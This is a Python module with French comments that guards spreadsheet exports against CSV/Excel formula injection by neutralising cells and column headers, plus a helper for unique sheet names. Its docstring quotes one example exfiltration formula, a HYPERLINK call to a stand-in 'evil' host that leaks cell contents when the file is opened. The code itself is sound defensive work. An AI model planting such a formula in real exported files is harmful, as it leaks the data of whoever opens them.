# agent/tools/spreadsheet_safety.py — Garde-fous partagés pour les exports Excel/CSV
#
# Utilisé à la fois par app_utils.py (mode simple) et
# agent/output/excel_generator.py (mode agent) : les deux écrivent des
# données venant d'un CSV téléversé par l'utilisateur dans des classeurs
# Excel, et doivent donc s'en protéger de la même façon. Vit dans le package
# agent plutôt que dans app_utils.py pour rester réutilisable sans faire
# dépendre le cœur de l'agent de la couche Streamlit.
import re

import pandas as pd

FORMULA_PREFIX_CHARS = ("=", "+", "-", "@", "\t", "\r")
INVALID_EXCEL_SHEET_CHARS = re.compile(r"[:\\/?*\[\]]")


def _neutralize_value(v):
    return f"'{v}" if isinstance(v, str) and v.startswith(FORMULA_PREFIX_CHARS) else v


def neutralize_formulas(df: pd.DataFrame) -> pd.DataFrame:
    """Empêche l'injection de formule CSV/Excel (CWE-1236).

    Les données réexportées viennent d'un CSV téléversé par l'utilisateur --
    une cellule texte commençant par =, +, -, @, tab ou retour chariot est
    interprétée comme une formule par Excel/LibreOffice à l'ouverture
    (ex. `=HYPERLINK("http://evil/"&A1)` peut exfiltrer des données dès
    l'ouverture du fichier). On préfixe ces valeurs d'une apostrophe,
    convention standard qui force leur traitement en texte.

    Couvre aussi les **en-têtes de colonnes** : ce sont, tout autant que les
    cellules, du texte tel quel du CSV téléversé -- un nom de colonne
    `=HYPERLINK(...)` réexporté sans y toucher serait tout aussi exploitable
    que la même valeur dans une cellule. Oublié dans la première version de
    cette fonction (seules les valeurs de cellules étaient neutralisées).
    """
    df = df.copy()
    df.columns = [_neutralize_value(c) for c in df.columns]
    for col in df.select_dtypes(include=["object", "str"]).columns:
        df[col] = df[col].map(_neutralize_value)
    return df


def unique_sheet_title(title: str, used: set) -> str:
    """Rend un titre compatible avec les contraintes de nom d'onglet Excel (31 car., uniques).

    `used` est mutée (le titre retourné y est ajouté) : l'appelant doit
    réutiliser le même set d'un appel à l'autre pour garantir l'unicité sur
    tout le classeur.
    """
    base = INVALID_EXCEL_SHEET_CHARS.sub("_", title)[:31] or "Feuille"
    candidate = base
    i = 2
    while candidate in used:
        suffix = f"_{i}"
        candidate = base[: 31 - len(suffix)] + suffix
        i += 1
    used.add(candidate)
    return candidate
